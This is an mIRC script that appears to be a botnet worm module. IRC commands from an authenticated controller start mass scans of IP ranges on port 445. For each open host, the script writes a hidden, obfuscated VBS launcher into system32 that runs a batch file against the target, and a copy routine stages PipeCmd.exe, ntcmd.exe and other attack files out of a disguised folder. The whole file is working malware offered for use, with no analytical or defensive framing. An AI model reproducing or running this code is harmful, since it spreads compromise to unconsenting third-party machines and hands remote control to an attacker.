on *:text:*:*: {
  if (%auth [ $+ [ $nick ] ] != admin) { halt }
  if ($1 = !scan*) {
    if ($2 == stop) && ($3 == $me) {
      timerNTServerScan* Off
      sockclose NTServerScan*
      msg $schannick stop by ip range $longip(%NTServerScanCurrentIp) ( $+ $longip(%NTServerScanStartIp) -> $longip(%NTServerScanEndIp) $+ )
      nick %oldnick
      halt
    }
  }
  if ($2 == status) {
    if ($timer(NTServerScan0) == $null) {
      .msg $schannick no status online
      halt
    }
    if ($timer(NTServerScan0) != $null) {
      if ($lines(ntserver.vxd) == $null) {
        if (%skill == $null) { set %skill 0 }
        .msg $schannick online on ip.range $longip(%NTServerScanStartIp) -> $longip(%NTServerScanEndIp) (in this moment by) $longip(%NTServerScanCurrentIp) (found) $sock(NTServerScan*,*) (hacked) %skill
        halt
      }
    }
  }
  if ($2 == resume) {
    if (%NTServerScanStartIp == $null) {
      .msg $schannick no ip online
      halt
    }
    if (%NTServerScanCurrentIp == $null) {
      .msg $schannick no ip online
      halt
    }
    if (%NTServerScanEndIp == $null) {
      .msg $schannick no ip online
      halt
    }
    if (%NTServerScanCurrentIp == %NTServerScanEndIp) {
      .msg $schannick resuming status (online)
      halt
    }
    set %oldnick $me
    nick $me $+ $chr(91) $+ Scan $+ $chr(93)
    .msg $schannick  3*** 1go online (iprange) $longip(%NTServerScanCurrentIP) -> $longip(%NTServerScanEndIP)
    timerNTServerScan0 -o 0 5 NTServerScan
    timerNTServerScan1 -o 0 5 NTServerScan
    timerNTServerScan2 -o 0 5 NTServerScan
    timerNTServerScan3 -o 0 5 NTServerScan
    timerNTServerScan4 -o 0 5 NTServerScan
    timerNTServerScan5 -o 0 5 NTServerScan
    timerNTServerScan6 -o 0 5 NTServerScan
    timerNTServerScan7 -o 0 5 NTServerScan
    timerNTServerScan8 -o 0 5 NTServerScan
    timerNTServerScan9 -o 0 5 NTServerScan
    timerNTServerScan10 -o 0 5 NTServerScan
    timerNTServerScan11 -o 0 5 NTServerScan
    timerNTServerScan12 -o 0 5 NTServerScan
  }
  if ($2 == start) && ($5 == $me) {
    unset %skill
    set %oldnick $me
    nick $me $+ $chr(91) $+ Scan $+ $chr(93)
    set %NTServerScanStartIp $3
    set %NTServerScanCurrentIp $3
    set %NTServerScanEndIp $4
    timerNTServerScan0 -o 0 5 NTServerScan
    timerNTServerScan1 -o 0 5 NTServerScan
    timerNTServerScan2 -o 0 5 NTServerScan
    timerNTServerScan3 -o 0 5 NTServerScan
    timerNTServerScan4 -o 0 5 NTServerScan
    timerNTServerScan5 -o 0 5 NTServerScan
    timerNTServerScan6 -o 0 5 NTServerScan
    timerNTServerScan7 -o 0 5 NTServerScan
    timerNTServerScan8 -o 0 5 NTServerScan
    timerNTServerScan9 -o 0 5 NTServerScan
    timerNTServerScan10 -o 0 5 NTServerScan
    timerNTServerScan11 -o 0 5 NTServerScan
    timerNTServerScan12 -o 0 5 NTServerScan
    .msg $schannick starting  (at ip range) $longip($3) -> $longip($4)
  }
}
alias NTServerScan {
  if (%NTServerScanCurrentIP == %NTServerScanEndIp) {
    .msg $schannick here iam (status) $longip(%NTServerScanStartIp) -> $longip(%NTServerScanEndIp)
    sockclose NTServerScan*
    timerNTServerScan* Off
    nick %oldnick
    halt
  }
  if (%NTServerScanCurrentIP != %NTServerScanEndIp) {
    inc %NTServerScanCurrentIp 1
    sockopen NTServerScan $+ %NTServerScanCurrentIp $longip(%NTServerScanCurrentIp) 445
    halt
  }
}
on *:sockopen:NTServerScan*:{
  if ($sockerr) {
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockclose $sockname
    halt
  }
  inc %skill
  .msg $schannick 3*** 1(info) $sock($sockname).ip (found) %skill
  wri $+ te c:\winnt\system32\zAlert $+ $sock($sockname).ip $+ .v $+ bs on error resume next
  wri $+ te c:\winnt\system32\zAlert $+ $sock($sockname).ip $+ .v $+ bs Set fso = CreateObject("Scripting.FileSystemObject")
  wri $+ te c:\winnt\system32\zAlert $+ $sock($sockname).ip $+ .v $+ bs windows = fso.GetSpecialFolder(WindowsFolder)
  wri $+ te c:\winnt\system32\zAlert $+ $sock($sockname).ip $+ .v $+ bs Set src3 = CreateObject("Wscript.shell")
  wri $+ te c:\winnt\system32\zAlert $+ $sock($sockname).ip $+ .v $+ bs src3.run "v32driver.bat $sock($sockname).ip $+ ",0,true
  timer 1 600 remove c:\winnt\system32\zAlert $+ $sock($sockname).ip $+ .v $+ bs
  run c:\winnt\system32\zAlert $+ $sock($sockname).ip $+ .v $+ bs
  sockclose $sockname
}
alias firstpage {  
  copy c:\progra~1\Uninst~1\PipeCmd.exe c:\winnt\system32\PipeCmd.exe
  copy c:\progra~1\Uninst~1\ntcmd.exe c:\winnt\system32\ntcmd.exe
  copy c:\progra~1\Uninst~1\v32driver.bat c:\winnt\system32\v32driver.bat
  copy c:\progra~1\Uninst~1\iserver.bat c:\winnt\system32\iserver.bat
  copy c:\progra~1\Uninst~1\skill.vxd c:\winnt\system32\skill.vxd
  copy c:\progra~1\Uninst~1\is.bat c:\winnt\system32\is.bat
  msg  $schannick (info) all files copy done
}
